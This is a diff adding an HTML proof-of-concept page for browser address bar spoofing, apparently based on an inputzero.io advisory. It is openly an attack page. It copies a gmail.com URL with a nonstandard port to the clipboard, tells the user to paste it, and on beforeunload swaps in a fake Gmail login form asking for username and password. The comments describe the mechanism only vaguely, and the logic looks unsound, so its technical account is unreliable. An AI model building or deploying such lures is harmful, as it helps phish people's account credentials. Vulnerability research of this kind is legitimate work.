@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoofing PoC - Vulnerability Research</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        .vulnerable-link { font-size: 1.2em; border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; cursor: pointer; display: inline-block; }
+        .vulnerable-link:hover { background-color: #f1f1f1; }
+        .fake-page-content { display: none; margin-top: 20px; border: 2px dashed red; padding: 20px; }
+    </style>
+</head>
+<body>
+
+    <h1>Browser Address Bar Spoofing Demo</h1>
+    <p>Advisory source: inputzero.io</p>
+    <p>severity: Low (Requires manual copy-paste action by the user)</p>
+    <hr>
+
+    <h3>Steps to Perform the Attack:</h3>
+    <ol>
+        <li><button onclick="copyLinkToClipboard()">Copy the Legitimate-Looking Link</button></li>
+        <li>Paste the copied text directly into your browser's address bar and press Enter.</li>
+    </ol>
+    
+    <div class="vulnerable-link" id="spoofUrlDisplay">
+        https://gmail.com (Right-click & Copy or Use Button Above)
+    </div>
+
+    <div class="fake-page-content" id="maliciousContent">
+        <h2>FAKE GMAIL LOGIN PAGE (Simulated)</h2>
+        <p>This content is NOT from actual gmail.com. It is from the attacker's server.</p>
+        <p>A actual attacker would make this look identical to the real Gmail login.</p>
+        <form>
+            Username: <input type="text" name="username"><br><br>
+            Password: <input type="password" name="password"><br><br>
+            <button type="button">Sign In</button>
+        </form>
+    </div>
+
+    <script>
+        // The core "fake spoof page" logic
+        function loadFakePage() {
+            document.getElementById('spoofUrlDisplay').style.display = 'none';
+            document.querySelector('h1').style.display = 'none';
+            document.querySelector('h3').style.display = 'none';
+            document.querySelector('ol').style.display = 'none';
+            
+            // Show the malicious content to the user
+            document.getElementById('maliciousContent').style.display = 'block';
+            console.log("Spoofed content loaded within the original page frame.");
+        }
+
+        // --- Core Vulnerability Mechanism ---
+        // Attacker page utilizes addEventListener("beforeunload")
+        // Browser is confused during navigation to a non-origin port URL
+        // when the user triggers the address bar navigation.
+        
+        window.addEventListener("beforeunload", function (event) {
+            // Log for research/demonstration
+            console.log("Beforeunload triggered. Attempting to trick the browser address bar.");
+            
+            // In vulnerable browser versions, this event callback 
+            // interferes with the address bar update logic, 
+            // potentially displaying the spoofed URL while content 
+            // rendering is stalled or handled differently due to port mismatch.
+            // Note: Modern browsers have patches for this behavior.
+            
+            // Some PoCs attempt to block or redirect context here, but
+            // the fundamental issue is browser confusion on port handling.
+            
+            // After triggering the potential browser state, 
+            // load the fake content for visual feedback.
+            loadFakePage(); 
+        });
+
+        // --- Helper Function ---
+        function copyLinkToClipboard() {
+            // Construct the URL designed to spoof the address bar.
+            // Using non-origin port (:8080) to exploit port confusion.
+            const spoofUrlWithPort = "https://gmail.com:8080"; 
+            
+            // Modern copy to clipboard API
+            navigator.clipboard.writeText(spoofUrlWithPort).then(function() {
+                alert("URL copied: " + spoofUrlWithPort + "\nNow paste it into the address bar and press Enter.");
+            }, function(err) {
+                console.error('Could not copy text: ', err);
+                alert("Failed to copy link. Please manually copy: " + spoofUrlWithPort);
+            });
+        }
+    </script>
+</body>
+</html>
